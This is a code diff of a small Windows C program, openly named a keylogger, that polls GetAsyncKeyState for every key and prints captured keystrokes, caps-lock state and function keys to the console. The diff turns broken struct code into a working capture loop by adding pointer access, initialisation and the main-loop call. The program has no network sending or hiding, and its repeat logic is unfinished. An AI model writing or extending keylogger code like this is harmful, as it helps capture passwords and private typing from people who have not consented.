@@ -3,37 +3,37 @@
 #include <windows.h>
 
 typedef struct s_key {
-	BOOL keyStates[256] = {FALSE};
-	BOOL isCapsLockOn = FALSE;
- 	DWORD keyPressTime[256] = {0};
-	DWORD lastRepeatTime[256] = {0};
+	BOOL keyStates[256];
+	BOOL isCapsLockOn;
+	DWORD keyPressTime[256];
+	DWORD lastRepeatTime[256];
 
-	DWORD currentTime = GetTickCount();
+	DWORD currentTime;
 
-	DWORD repeatDelay = 0;
-	DWORD repeatSpeed = 0;
-	DWORD delayMs = 0;
-	DWORD intervalMs = 0;
+	DWORD repeatDelay;
+	DWORD repeatSpeed;
+	DWORD delayMs;
+	DWORD intervalMs;
 }	t_key;
 
-void	keyPress(t_key *keyData)
+int	handleKeyPress(t_key *keyData)
 {
 	 for (int key = 8; key <= 255; key++)
 		{
 			SHORT currentState = GetAsyncKeyState(key);
 			BOOL isPressed = (currentState & 0x8000) != 0;
 
-			if (isPressed && !keyStates[key])
+			if (isPressed && !keyData->keyStates[key])
 			{
-				keyPressTime[key] = currentTime;
-				lastRepeatTime[key] = currentTime;
+				keyData->keyPressTime[key] = keyData->currentTime;
+				keyData->lastRepeatTime[key] = keyData->currentTime;
 				if (key == VK_ESCAPE)
 					return 0;
 				if (key == VK_RETURN)
 					printf("\n");
 				else if (key >= 32 && key <= 126)
 				{
-					if (isCapsLockOn)
+					if (keyData->isCapsLockOn)
 						printf("%c", key);
 					else
 						printf("%c", key + 32);
@@ -44,31 +44,41 @@ void	keyPress(t_key *keyData)
 					printf("[BACKSPACE]");
 				else if (key == VK_CAPITAL)
 				{
-					isCapsLockOn = !isCapsLockOn;
+					keyData->isCapsLockOn = !keyData->isCapsLockOn;
 					printf("[CAPS_LOCK]");
 				}
 				else if (key >= VK_F1 && key <= VK_F24)
 					printf("[F%d]", key - VK_F1 + 1);
 			}
-			else if (isPressed && keyStates[key])
+			else if (isPressed && keyData->keyStates[key])
 			{
 				// TODO key repeat logic
-				DWORD sincePressTime = currentTime - keyPressTime[key];
-				DWORD sinceRepeatTime = currentTime - lastRepeatTime[key];
-				if (sincePressTime >= delayMs && sinceRepeatTime >= intervalMs)
+				DWORD sincePressTime = keyData->currentTime - keyData->keyPressTime[key];
+				DWORD sinceRepeatTime = keyData->currentTime - keyData->lastRepeatTime[key];
+				if (sincePressTime >= keyData->delayMs && sinceRepeatTime >= keyData->intervalMs)
 				{
 					printf("key repeat LOG");
-					lastRepeatTime[key] = currentTime;
+					keyData->lastRepeatTime[key] = keyData->currentTime;
 				}
 			}
-			keyStates[key] = isPressed;
+			keyData->keyStates[key] = isPressed;
 		}
 		Sleep(10);
+	return 0;
 }
 
 void	initKeylogger(t_key *keyData)
 {
 	
+	for (size_t i = 0; i < 256; i++)
+	{
+		keyData->keyStates[i] = FALSE;
+		keyData->keyPressTime[i] = 0;
+		keyData->lastRepeatTime[i] = 0;
+	}
+	keyData->isCapsLockOn = FALSE;
+	keyData->currentTime = GetTickCount();
+
 	SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &keyData->repeatDelay, 0);
 	SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &keyData->repeatSpeed, 0);
 	
@@ -87,6 +97,6 @@ int main(void)
 	initKeylogger(&keyData);
 	while (1)
 	{
-	   
+	   handleKeyPress(&keyData);
 	}
 }
